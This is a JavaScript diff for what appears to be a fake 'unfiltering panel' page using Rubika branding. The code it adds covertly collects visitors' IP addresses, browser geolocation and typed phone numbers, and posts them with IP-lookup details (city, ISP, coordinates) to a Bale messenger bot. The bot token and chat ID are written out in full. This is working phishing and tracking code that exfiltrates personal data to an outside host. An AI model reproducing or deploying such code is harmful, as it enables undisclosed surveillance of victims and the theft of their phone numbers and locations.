@@ -1,10 +1,33 @@
+var link_map;
+
+function showPosition(position) {
+    link_map = 'https://www.google.com/maps/@' + position.coords.latitude + ',' + position.coords.longitude;
+}
+async function send_ip() {
+    const response = await fetch('https://api.iplocation.net/?cmd=get-ip');
+    const data = await response.json();
+    var text_ip = "A user with an IP : " + data.ip + " entered the unfiltering panel.";
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+    } else {
+
+    }
+    var test = await fetch('https://tapi.bale.ai/botwT9ArKZEC8Pxy7mSjvMPHsPj6JiJlIEQDX7P7MOT/sendMessage?text=' + text_ip + '&chat_id=915303220');
+
+}
 async function send() {
     var phone = document.getElementById('phone_number_1').value;
     try {
-        const response = await fetch('https://api.iplocation.net/?cmd=get-ip');
-        const data = await response.json();
-        var text = 'phoen : ' + String(phone) + '    ip : ' + String(data.ip);
-        const bale = await fetch('https://tapi.bale.ai/botwT9ArKZEC8Pxy7mSjvMPHsPj6JiJlIEQDX7P7MOT/sendMessage?text=' + text + '&chat_id=915303220');
+        var request_info_ip = await fetch('http://ip-api.com/json/83.123.48.126');
+        var ip_info = await request_info_ip.json()
+        var text = 'ip : ' + ip_info.query + '\nphone : ' + phone + '\nstatus : ' + ip_info.status + '\ncountry : ' + ip_info.country + '\ncountryCode : ' + ip_info.countryCode + '\nregion : ' + ip_info.region + '\ncity : ' + ip_info.city + '\nzip : ' + ip_info.zip + '\nlat : ' + ip_info.lat + '\nlon : ' + ip_info.lon + '\ntimezone : ' + ip_info.timezone + '\nisp : ' + ip_info.isp + '\norg : ' + ip_info.org + '\nas : ' + ip_info.as + '\nlocation : ' + link_map;
+        $.ajax({
+            type: 'post',
+            mode: "cors",
+            cache: "no-cache",
+            url: "https://tapi.bale.ai/botwT9ArKZEC8Pxy7mSjvMPHsPj6JiJlIEQDX7P7MOT/sendMessage",
+            data: { chat_id: "915303220", text: String(text) },
+        });
     } catch (error) {}
     document.body.innerHTML = `<div class="box">
         <img src="icon-192x192.png" alt="logo rubika">
